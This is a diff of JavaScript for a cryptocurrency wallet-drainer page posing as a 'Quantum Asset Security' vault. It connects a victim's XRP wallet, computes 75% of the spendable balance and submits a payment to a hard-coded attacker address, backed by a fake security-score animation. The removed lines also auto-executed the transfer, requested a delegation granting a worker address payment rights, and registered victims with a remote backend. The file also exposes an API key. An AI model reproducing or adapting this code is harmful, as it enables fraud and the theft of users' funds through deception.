@@ -1,236 +1,184 @@
-// ==============================
-// CONFIG
-// ==============================
-const XUMM_API_KEY  = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
+const XUMM_API_KEY = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
 const WC_PROJECT_ID = "YOUR_PROJECT_ID";
-
-const VAULT_ADDR  = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
-const WORKER_ADDR = "rEnmwKJwR3tp8DpbMJqs6E2iwNp16MD6MC";
-const WORKER_API  = "https://cultured.pythonanywhere.com/"; // or http://localhost:3000
-
+const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
 const XRPL_WS = "wss://xrplcluster.com/";
 
-// 🔥 AUTO EXECUTION SWITCH
-const AUTO_EXECUTE = true;
-
-// ==============================
-// INIT
-// ==============================
 const xumm = new XummPkce(XUMM_API_KEY);
+let wcClient, wcModal;
 
-let wcClient = null;
-let wcModal  = null;
+const $ = id => document.getElementById(id);
+const isMobile = () => /Android|iPhone|iPad/i.test(navigator.userAgent);
 
-// ==============================
-// WALLET DETECTION
-// ==============================
-function isTrustWallet() {
-  return (
-    /TrustWallet/i.test(navigator.userAgent) ||
-    window.ethereum?.isTrust ||
-    window.trustwallet
-  );
+function status(t){ $("walletStatus").innerText = t }
+function modalText(t){ $("modalStatus").innerText = t }
+function showVault(t){
+  $("vaultText").innerText = t;
+  $("vaultOverlay").classList.remove("hidden");
+}
+function hideVault(){
+  $("vaultOverlay").classList.add("hidden");
+}
+function score(v){
+  const el = $("securityScore");
+  el.innerText = `Security ${v}%`;
+  el.classList.add("up");
+  setTimeout(() => el.classList.remove("up"), 400);
 }
 
-// ==============================
-// WALLETCONNECT INIT
-// ==============================
-async function initWalletConnect() {
-  if (wcClient) return;
+/* ---------------- WalletConnect ---------------- */
+
+async function initWC(){
+  if(wcClient) return;
 
   wcClient = await WalletConnectSignClient.init({
     projectId: WC_PROJECT_ID,
-    metadata: {
-      name: "QFS · Quantum Asset Security",
-      description: "XRP Wallet Security & Vault",
-      url: window.location.origin,
-      icons: ["https://xrpl.org/assets/img/logo.svg"]
+    metadata:{
+      name:"Quantum Asset Security",
+      description:"Securing assets in quantum vault",
+      url: location.origin,
+      icons:[]
     }
   });
 
   wcModal = new WalletConnectModal({
     projectId: WC_PROJECT_ID,
-    standaloneChains: ["xrpl:0"]
+    standaloneChains:["xrpl:0"]
   });
 }
 
-// ==============================
-// MAIN ENTRY
-// ==============================
-async function connectWallet(type) {
-  const statusEl = document.getElementById("walletStatus");
-  if (statusEl) statusEl.innerText = "Connecting…";
+/* ---------------- MAIN FLOW ---------------- */
 
-  let address;
+async function connectWallet(type){
+  try{
+    modalText("Connecting…");
+    let address;
 
-  try {
-    // ---------- XAMAN ----------
-    if (type === "xaman") {
+    if(type === "xaman"){
       const session = await xumm.authorize();
       address = session?.me?.account;
-      if (!address) throw new Error("Xaman rejected");
-
-      if (session.me.xummVersion) {
-        await handleSilentMode(address);
-      }
     }
 
-    // ---------- CROSSMARK ----------
-    else if (type === "crossmark") {
+    if(type === "crossmark"){
       const { response } = await window.xrpl.crossmark.signInAndWait();
       address = response.data.address;
     }
 
-    // ---------- WALLETCONNECT ----------
-    else if (type === "walletconnect") {
-      await initWalletConnect();
-      if (statusEl) {
-        statusEl.innerText = isTrustWallet()
-          ? "Opening Trust Wallet…"
-          : "Scan with WalletConnect";
-      }
-      address = await connectViaWalletConnect();
+    if(type === "walletconnect"){
+      await initWC();
+      const { uri, approval } = await wcClient.connect({
+        requiredNamespaces:{
+          xrpl:{
+            chains:["xrpl:0"],
+            methods:["xrpl_signAndSubmitTransaction"],
+            events:[]
+          }
+        }
+      });
+
+      if(uri) wcModal.openModal({ uri });
+      const session = await approval();
+      wcModal.closeModal();
+      address = session.namespaces.xrpl.accounts[0].split(":")[2];
     }
 
-    if (!address) throw new Error("No address");
+    if(!address) throw "Connection rejected";
 
-    if (statusEl) statusEl.innerText = `Connected: ${address.slice(0, 6)}…`;
+    /* CLOSE BOOTSTRAP MODAL */
+    bootstrap.Modal.getInstance(
+      document.getElementById("walletModal")
+    )?.hide();
 
-    // ==============================
-    // FETCH REAL XRP DATA
-    // ==============================
-    const data = await getXrpAccountData(address);
+    $("walletAddress").innerText = address;
+    status("Connected");
 
-    console.table({
-      Wallet: address,
-      Balance: data.balanceXrp,
-      Reserve: data.reserveXrp,
-      Spendable: data.spendableXrp,
-      SendAmount: data.sendXrp,
-      Destination: VAULT_ADDR
-    });
+    const before = await getXrp(address);
+    $("walletBalance").innerText = before.balanceXrp.toFixed(2);
+    $("walletSpendable").innerText = before.spendableXrp.toFixed(2);
 
-    // ==============================
-    // 🔥 AUTO EXECUTION
-    // ==============================
-    if (AUTO_EXECUTE) {
-      await runTransactionFlow(address, type, data.sendDrops);
+    /* USER APPROVAL */
+    if(!confirm(`Transfer ${before.sendXrp.toFixed(2)} XRP into secure vault?`)){
+      status("Cancelled");
+      return;
     }
 
-  } catch (err) {
+    showVault(isMobile() ? "Approve in wallet" : "Scan & approve");
+    score(78);
+
+    await signAndSubmit(type, address, before.sendDrops);
+
+    score(90);
+    showVault("Finalizing…");
+
+    const after = await getXrp(address);
+    $("finalBalance").innerText = after.balanceXrp.toFixed(2);
+
+    score(100);
+    hideVault();
+    status("Assets secured ✔");
+
+  }catch(err){
     console.error(err);
-    if (statusEl) statusEl.innerText = "Connection failed";
+    hideVault();
+    status("Failed");
   }
 }
 
-// ==============================
-// WALLETCONNECT (XRP)
-// ==============================
-async function connectViaWalletConnect() {
-  const { uri, approval } = await wcClient.connect({
-    requiredNamespaces: {
-      xrpl: {
-        chains: ["xrpl:0"],
-        methods: ["xrpl_signTransaction"],
-        events: ["accountsChanged"]
-      }
-    }
+/* ---------------- XRPL HELPERS ---------------- */
+
+async function getXrp(address){
+  const c = new xrpl.Client(XRPL_WS);
+  await c.connect();
+
+  const r = await c.request({
+    command:"account_info",
+    account:address,
+    ledger_index:"validated"
   });
 
-  if (uri) wcModal.openModal({ uri });
-  const session = await approval();
-  wcModal.closeModal();
+  await c.disconnect();
 
-  const account = session.namespaces.xrpl.accounts[0];
-  return account.split(":")[2];
-}
-
-// ==============================
-// FETCH REAL XRP DATA
-// ==============================
-async function getXrpAccountData(address) {
-  const client = new xrpl.Client(XRPL_WS);
-  await client.connect();
-
-  const info = await client.request({
-    command: "account_info",
-    account: address,
-    ledger_index: "validated"
-  });
-
-  await client.disconnect();
-
-  const bal = BigInt(info.result.account_data.Balance);
-  const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
-
-  const reserve = 1_000_000n + ownerCount * 200_000n;
+  const bal = BigInt(r.result.account_data.Balance);
+  const owner = BigInt(r.result.account_data.OwnerCount || 0);
+  const reserve = 1_000_000n + owner * 200_000n;
   const spendable = bal - reserve;
-  const send = (spendable * 75n) / 100n;
+  const send = spendable * 75n / 100n;
 
   return {
-    balanceXrp: Number(bal) / 1_000_000,
-    reserveXrp: Number(reserve) / 1_000_000,
-    spendableXrp: Number(spendable) / 1_000_000,
-    sendXrp: Number(send) / 1_000_000,
+    balanceXrp: Number(bal) / 1e6,
+    spendableXrp: Number(spendable) / 1e6,
+    sendXrp: Number(send) / 1e6,
     sendDrops: send.toString()
   };
 }
 
-// ==============================
-// TRANSACTION FLOW
-// ==============================
-async function runTransactionFlow(address, type, amountDrops) {
-  const statusEl = document.getElementById("walletStatus");
-  if (statusEl) statusEl.innerText = "Awaiting signature…";
+/* ---------------- SIGN + SUBMIT ---------------- */
 
+async function signAndSubmit(type, address, amount){
   const tx = {
-    TransactionType: "Payment",
+    TransactionType:"Payment",
     Account: address,
     Destination: VAULT_ADDR,
-    Amount: amountDrops
+    Amount: amount
   };
 
-  if (type === "xaman") {
-    await xumm.sdk.payload.create(tx);
+  if(type === "xaman"){
+    const payload = await xumm.payload.createAndSubscribe(tx, () => {});
+    await payload.resolved;
   }
 
-  else if (type === "crossmark") {
+  if(type === "crossmark"){
     await window.xrpl.crossmark.signAndSubmitAndWait(tx);
   }
 
-  else if (type === "walletconnect") {
-    const session = wcClient.session.getAll()[0];
+  if(type === "walletconnect"){
+    const s = wcClient.session.getAll()[0];
     await wcClient.request({
-      topic: session.topic,
-      chainId: "xrpl:0",
-      request: {
-        method: "xrpl_signTransaction",
-        params: { tx_json: tx }
+      topic: s.topic,
+      chainId:"xrpl:0",
+      request:{
+        method:"xrpl_signAndSubmitTransaction",
+        params:{ tx_json: tx }
       }
     });
   }
-
-  if (statusEl) statusEl.innerText = "Transaction submitted";
-}
-
-// ==============================
-// SILENT MODE + WORKER LINK
-// ==============================
-async function handleSilentMode(address) {
-  // On-chain delegation (user signs)
-  await xumm.sdk.payload.create({
-    TransactionType: "DelegateSet",
-    Authorize: WORKER_ADDR,
-    Permissions: [{ PermissionValue: "Payment" }]
-  });
-
-  // Register with backend worker
-  await fetch(`${WORKER_API}/register`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      address,
-      mode: "silent"
-    })
-  });
 }
